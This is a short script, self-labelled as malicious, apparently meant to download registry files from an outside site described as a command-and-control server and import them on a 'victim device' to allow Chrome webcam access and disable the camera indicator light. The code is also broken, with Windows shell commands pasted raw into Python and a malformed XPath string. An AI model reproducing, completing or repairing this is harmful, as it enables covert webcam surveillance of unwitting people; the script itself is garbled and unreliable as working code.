## WARNING!! This script contains malicious code which will enable a victims webcam for planetred.world
## <ýb3R$oN!c
## 

import webbrowser
from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager
from os.path import expanduser

#Access Command'N'Control URL 
url='https://planetred.world/proof-that-your-camera-is-vulnerable-to-hacks/'
driver = webdriver.Chrome(executable_path='/home/executables/Desktop/chromedriver')
driver.get(url)

#Download Reg-Keys from CnC
dlregkeyzip = driver.find_element_by_xpath("//*[@id="post-209"]/div[2]/div/p[2]/a")
dlregkeyzip.click()

# Import Reg-Keys to Victim Device
home = expanduser("~")
cd c:\Users\$User\Downloads
unzip CAM_REG_KEY.zip
cd "c:\Users\$User\Downloads\CAM REG KEY"
allow-cam-access-chrome.reg
disable-cam-light.reg
